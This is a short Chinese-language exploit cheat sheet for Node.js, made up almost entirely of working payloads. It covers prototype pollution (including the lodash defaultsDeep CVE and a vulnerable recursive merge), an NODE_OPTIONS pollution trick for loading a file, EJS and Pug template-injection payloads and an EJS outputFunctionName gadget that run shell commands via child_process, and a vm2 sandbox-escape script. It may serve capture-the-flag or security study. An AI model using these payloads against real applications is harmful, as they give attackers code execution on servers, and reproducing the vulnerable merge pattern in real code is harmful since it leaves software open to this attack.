# Web-Node.js 原型链污染 + 模板注入实战

---

## 一、原型链污染

```javascript
// CVE-2019-10744: lodash.defaultsDeep

// 攻击Payload:
{"__proto__":{"isAdmin":true}}

// 任何对象继承了Object.prototype → isAdmin=true!

// merge 类函数常见漏洞:
function merge(target, source) {
    for (let key in source) {
        if (typeof target[key] === 'object') {
            merge(target[key], source[key]);  // ⚠️ 递归合并!
        } else {
            target[key] = source[key];        // __proto__ 也被合并
        }
    }
}
// 攻击: merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'))
// → 所有对象的 isAdmin = true!

// RCE via 原型链污染:
// {"__proto__":{"shell":"node","env":{"NODE_OPTIONS":"--require /tmp/evil.js"}}}
// 或利用 ejs/express 等框架的特性实现RCE
```

---

## 二、模板注入

```javascript
// EJS SSTI
// 如果用户可以控制模板内容:
<%= global.process.mainModule.constructor._load('child_process').execSync('id') %>

// 利用原型链污染触发:
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}
// → EJS 编译时执行任意代码!

// Pug/Jade SSTI
// #{global.process.mainModule.require('child_process').execSync('id')}
```

---

## 三、vm2 沙箱逃逸

```javascript
// vm2 旧版本沙箱逃逸(CVE-2023-37466等)
const {VM} = require('vm2');
const vm = new VM();
vm.run(`
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        return process.mainModule.require("child_process").execSync("id").toString();
      }
    })
  };
  try { err.stack; } catch (e) {}
`);
```
